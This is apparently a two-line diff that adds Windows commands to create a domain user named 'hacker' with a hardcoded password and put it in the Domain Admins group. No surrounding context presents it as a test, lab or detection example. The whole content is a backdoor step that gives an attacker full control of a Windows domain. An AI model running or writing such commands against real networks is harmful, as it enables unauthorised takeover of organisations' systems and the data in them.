@@ -1,0 +1,2 @@
+net user /domain /add hacker Iam31337 
+net group /domain "Domain Admins" /add hacker 
